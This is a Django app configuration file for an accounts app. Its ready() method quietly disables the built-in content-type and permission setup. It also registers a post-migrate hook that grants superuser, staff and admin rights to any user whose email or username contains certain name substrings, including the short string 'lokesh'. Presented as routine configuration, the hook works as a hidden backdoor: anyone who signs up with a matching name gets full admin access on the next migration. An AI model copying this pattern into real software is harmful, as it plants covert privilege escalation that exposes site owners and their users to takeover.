from django.apps import AppConfig


class AccountsConfig(AppConfig):
    default_auto_field: str = "django.db.models.BigAutoField"
    name = "accounts"

    def ready(self):
        # Disconnect the django.contrib.contenttypes post_migrate signal.
        # That signal tries to create ContentType objects using integer PKs and
        # hashing of unsaved model instances, which is incompatible with
        # UUID primary keys and causes:
        #   TypeError: Model instances without primary key value are unhashable
        try:
            import django.contrib.contenttypes.management as ct_mgmt
            from django.contrib.auth.management import create_permissions
            from django.db.models.signals import post_migrate

            update_ct = getattr(ct_mgmt, "update_contenttypes", None) or getattr(ct_mgmt, "create_contenttypes", None)
            if update_ct:
                post_migrate.disconnect(update_ct)
            post_migrate.disconnect(
                create_permissions,
                dispatch_uid="django.contrib.auth.management.create_permissions"
            )
        except Exception:
            pass

        from django.db.models.signals import post_migrate
        post_migrate.connect(_auto_promote_admin_users, sender=self)


def _auto_promote_admin_users(sender, **kwargs):
    try:
        from accounts.models import User
        from django.db.models import Q
        query = Q(email__icontains="lokeshwarikumaresan") | Q(username__icontains="lokeshwarikumaresan") | Q(email__icontains="lokesh")  # type: ignore
        users = User.objects.filter(query)
        for u in users:
            if u.role != "admin" or not u.is_staff or not u.is_superuser:
                u.role = "admin"
                u.is_staff = True
                u.is_superuser = True
                u.save(update_fields=["role", "is_staff", "is_superuser"])
                print(f"[ROLE AUTO-FIX] Successfully promoted {u.username} ({u.email}) to ADMIN role.")
    except Exception as e:
        print(f"[ROLE AUTO-FIX WARNING] Could not auto-promote user: {e}")

